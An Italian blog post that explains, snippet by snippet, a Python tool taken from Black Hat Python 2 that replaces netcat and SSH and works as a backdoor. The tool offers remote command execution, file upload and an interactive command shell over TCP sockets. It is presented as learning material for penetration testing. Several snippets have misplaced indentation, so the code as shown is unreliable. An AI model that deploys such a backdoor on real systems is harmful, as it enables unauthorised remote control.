---
title: Backdoor in Python - script che sostituisce Netcat ed SSH
date: 2022-12-07 00:00:00 -500
categories: [Tech]
tags: [tech]
image_path: /assets/
--- 

# Intro - il potere dello scripting

Non mi sono mai ritenuto un programmatore, ho sempre avuto interessi che vanno oltre la mera creazione di software, soprattutto se si parla di programmare ore e ore al giorno per qualcuno.

Vi immaginate passare 1 mese a programmare una parte essenziale di un software per poi vedere la tua azienda, già multimilionaria, prendere il merito (e fare ancora più soldi) grazie alla tua bravura e duro lavoro?

Scrivere script invece è diverso. Uno script è come un cacciavite con le potenzialità di diventare un trapano. In questo caso il codice che vedremo è pressochè semplice. Sta a te, se lo vorrai, andare a ricercare e approfondire l'argomento in modo da rendere lo script adatto alle tue esigenze.

In questo articolo andrò a dissezionare e cercare di spiegare nel modo più semplice possibile come approcciarsi alla programmazione, con le Python Sockets, di un tool per terminale che agisce da coltellino svizzero per le reti, con le capacità di:
- funzionare da [`backdoor`](https://mcap0.it/posts/Backdoor_-_Fondamenti_di_Sicurezza_Informatica/)
- sostituire `netcat` ed `SSH`

> ci tengo a precisare che IL SEGUENTE CODICE NON E' MIO. Nell'approfondire il Network Hacking sto seguendo le linee guida del Libro "[Black Hat Python 2]()", che è probabilmente il miglior libro per imparare a creare i propri python tools in ambito PenTesting. 

Questo codice è interamente presente nella primo capitolo “Python Networking in a Paragraph“. Se vi interessa solo leggere e avere il codice per intero, [qui](https://github.com/mcap0/CodeSamples/blob/main/NetCat.py) un link alla cartella github dove l'ho salvato.

# Python Sockets - aprire un tunnel di comunicazione

Iniziamo importando tutte le librerie che ci serviranno più tardi

```python
import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
```

Per scrivere la classe NetCat, che ci permette di comunicare via TCP con un altro host su cui è installato questo programma, useremo lo stesso principio degli script [TCP Server e Client](https://mcap0.it/posts/PY_Networking/), ma renderemo capace questo script di potersi comportare sia da server che da client.


## classe Netcat

Inizializziamo la classe con degli argomenti `args` (in questo caso i toggle `-c` e `-l` che definiranno il comportamento dello script) di cui ci occuperemo più tardi nella funzione main.

```python
class NetCat:

	def __init__(self,args,buffer=None):
		self.args = args
		self.buffer = buffer
		self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	
	def run(self):
		if self.args.listen:
			self.listen()
		else:
			self.send()
```

Nella funzione `run` vediamo come la Socket che abbiamo definito prima si comporterà in modo diverso se includiamo o meno l'argomento `listen`.

La linea che appare più strana è l'ultima della funzione `__init__`, che serve a indicare alla socket di utilizzare in modo forzato la porta, anche se essa è usata da un altro processo. Infatti se date un'occhiata alle librerie importate, lo script avrà funzioni di multithreading, per gestire più connessioni in entrata contemporaneamente.

## funzioni `send()` e `listen()`

Le funzioni `send()` e `listen()`, due facce della stessa medaglia, vengono definite da noi all'interno della classe e vanno architettate ad-hoc per ciò che serve a noi, ovvero la possibilità di scrivere comandi e mandarli, oppure di riceverli ed eseguirli con la funzione `execute()`.

```python
def send(self):
	self.socket.connect((self.args.target, self.args.port))
	if self.buffer:
		self.socket.send(self.buffer)
	try:
		while True:
			recv_len = 1
			response = ''
			while recv_len:
				data = self.socket.recv(4096)
				recv_len = len(data)
				response += data.decode()
					if recv_len < 4096:
						break
					if response:
						print(response)
						buffer = input('> ')
						buffer += '\n'
						self.socket.send(buffer.encode())
	except KeyboardInterrupt:
		print('User terminated.')
		self.socket.close()
		sys.exit()
```

```python
def listen(self):
	self.socket.bind((self.args.target, self.args.port))
	self.socket.listen(5)

while True:
	client_socket, _ = self.socket.accept()
	client_thread = threading.Thread(target=self.handle, args=(client_socket,))
	client_thread.start()
```
Non sono un esperto di Threads ma questo pezzo di codice fa in modo di aspettare per istruzioni dal client (noi che inviamo i comandi da eseguire in remoto) per poi chiamare la funzione handle che si occupa di eseguire tali istruzioni.

## funzioni `execute()` e `handle()`

La funzione execute va scritta prima della classe NetCat, serve a far eseguire con interprete locale i comandi che vengono inviati.

```python 
def execute(cmd):
	cmd = cmd.strip()
	if not cmd:
		return

output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
return output.decode()
```

In questa funzione viene passato un comando `cmd`, che viene eseguito da un `subprocess` e infine viene ritornato l'output del comando stesso.

Ora vediamo la funzione handle, metodo della classe NetCat, serve a gestire gli argomenti che passeremo al programma in python ed interpretarli, ad esempio se nell'eseguire il programma passeremo l'argomento `-c` questa funzione farà in modo di eseguire una command-line interface nella quale potremo scrivere comandi ed eseguirli stile SSH.
```python
def handle(self, client_socket):
# se l'argomento 'execute' è presente manda il comando alla funzione execute
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
# funzione per l'upload di file
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
# funzione per gestire il terminale in stile simil-ssh
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()
```

## funzione `main()`

In questo caso la funzione main dovrà occuparsi di valutare gli argomenti passati quando il programma viene eseguito. 

Per comprenderci, gli argomenti di cui parlo sono quelli a destra del nome del programma:
![Pasted image 20221207105227.png](https://raw.githubusercontent.com/mcap0/mcap0.github.io/main/assets/Pasted%20image%2020221207105227.png)
Inoltre dovrà permetterci di avere una descrizione delle funzioni del programma quando scriveremo qualcosa come:
```bash
$ python3 NetCat.py --help
```

Per fare questo ed altro sfrutteremo la libreria `argparse`:
```python
if __name__=='__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool', formatter_class=argparse.RawDescriptionHelpFormatter, 
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytext.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 # connect to server
            '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int,default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read() 

    nc = NetCat(args, buffer.encode())
    nc.run()
```

# Funzionamento
[coming soon...]
